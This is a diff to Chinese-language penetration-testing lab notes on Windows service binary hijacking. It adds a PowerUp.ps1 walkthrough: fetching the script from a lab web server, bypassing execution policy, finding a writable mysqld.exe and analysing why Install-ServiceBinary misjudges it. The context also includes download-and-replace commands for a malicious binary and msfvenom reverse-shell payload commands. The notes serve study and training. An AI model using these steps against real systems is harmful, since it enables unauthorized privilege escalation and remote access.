@@ -1300,7 +1300,8 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
 #### 4. 將 compiled EXE 取代 original exe
 ```
-PS C:\Users\dave> iwr -uri http://192.168.45.188/adduser.exe -Outfile adduser.exe                            PS C:\Users\dave> move C:\xampp\mysql\bin\mysqld.exe mysqld.exe
+PS C:\Users\dave> iwr -uri http://192.168.45.188/adduser.exe -Outfile adduser.exe
+PS C:\Users\dave> move C:\xampp\mysql\bin\mysqld.exe mysqld.exe
 PS C:\Users\dave> move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe
 PS C:\Users\dave>
 ```
@@ -1384,6 +1385,84 @@ PS C:\Users\dave> runas /user:dave2 cmd
 > `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f psh > chw.ps1`
 > - Base64 encode PowerShell code:\
 > `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f psh-cmd`
+
+#### 6. [PowerUp.ps1](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc) automated tool
+```
+kali@kali:~$ cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .
+
+kali@kali:~$ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ..
+```
+##### 6.1 使用 `ExecutionPolicy Bypass` 啟動 powershell
+##### 6.2 使用 Get-ModifiableServiceFile 來尋找可修改的服務，例如服務二進位檔案或設定檔。
+```
+PS C:\Users\dave> iwr -uri http://192.168.48.3/PowerUp.ps1 -Outfile PowerUp.ps1
+
+PS C:\Users\dave> powershell -ep bypass
+...
+PS C:\Users\dave>  . .\PowerUp.ps1
+
+PS C:\Users\dave> Get-ModifiableServiceFile
+
+...
+
+ServiceName                     : mysql
+Path                            : C:\xampp\mysql\bin\mysqld.exe --defaults-file=c:\xampp\mysql\bin\my.ini mysql
+ModifiableFile                  : C:\xampp\mysql\bin\mysqld.exe
+ModifiableFilePermissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
+ModifiableFileIdentityReference : BUILTIN\Users
+StartName                       : LocalSystem
+AbuseFunction                   : Install-ServiceBinary -Name 'mysql'
+CanRestart                      : False
+```
+> `mysql` 服務的可執行檔 mysqld.exe 可被 BUILTIN\Users 群組成員（如 dave）修改。\
+但 CanRestart 為 False，所以無法直接重新啟動服務來觸發權限提升，可能需要重新開機。
+
+##### 6.3 嘗試利用 Install-ServiceBinary
+```
+PS C:\Users\dave> Install-ServiceBinary -Name 'mysql'
+
+Service binary 'C:\xampp\mysql\bin\mysqld.exe --defaults-file=c:\xampp\mysql\bin\my.ini mysql' for service mysql not
+modifiable by the current user.
+At C:\Users\dave\PowerUp.ps1:2178 char:13
++             throw "Service binary '$($ServiceDetails.PathName)' for s ...
++             ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : OperationStopped: (Service binary ...e current user.:String) [], RuntimeException
+    + FullyQualifiedErrorId : Service binary 'C:\xampp\mysql\bin\mysqld.exe --defaults-file=c:\xampp\mysql\bin\my.ini
+   mysql' for service mysql not modifiable by the current user.
+```
+> PowerUp 檢測到 mysqld.exe 可被修改\
+但 `Install-ServiceBinary` 卻判斷 mysql 服務無法被利用
+
+##### 6.4 分析 PowerUp 為何判斷錯誤
+```
+PS C:\Users\dave> $ModifiableFiles = echo 'C:\xampp\mysql\bin\mysqld.exe' | Get-ModifiablePath -Literal
+
+PS C:\Users\dave> $ModifiableFiles
+
+ModifiablePath                IdentityReference Permissions
+--------------                ----------------- -----------
+C:\xampp\mysql\bin\mysqld.exe BUILTIN\Users     {WriteOwner, Delete, WriteAttributes, Synchronize...}
+```
+> 表示 mysqld.exe 確實可被 BUILTIN\Users 修改
+
+加上參數:
+```
+PS C:\Users\dave> $ModifiableFiles = echo 'C:\xampp\mysql\bin\mysqld.exe argument' | Get-ModifiablePath -Literal
+
+PS C:\Users\dave> $ModifiableFiles
+
+ModifiablePath     IdentityReference                Permissions
+--------------     -----------------                -----------
+C:\xampp\mysql\bin NT AUTHORITY\Authenticated Users {Delete, WriteAttributes, Synchronize, ReadControl...}
+C:\xampp\mysql\bin NT AUTHORITY\Authenticated Users {Delete, GenericWrite, GenericExecute, GenericRead}
+
+PS C:\Users\dave> $ModifiableFiles = echo 'C:\xampp\mysql\bin\mysqld.exe argument -conf=C:\test\path' | Get-ModifiablePath -Literal 
+
+PS C:\Users\dave> $ModifiableFiles
+```
+> 這裡 `Get-ModifiablePath` 解析成了 C:\xampp\mysql\bin 而不是 mysqld.exe，導致 PowerUp 誤判。
+
 
 ### DLL Hijacking
 若沒有權限來取代這些 Binary File ...\
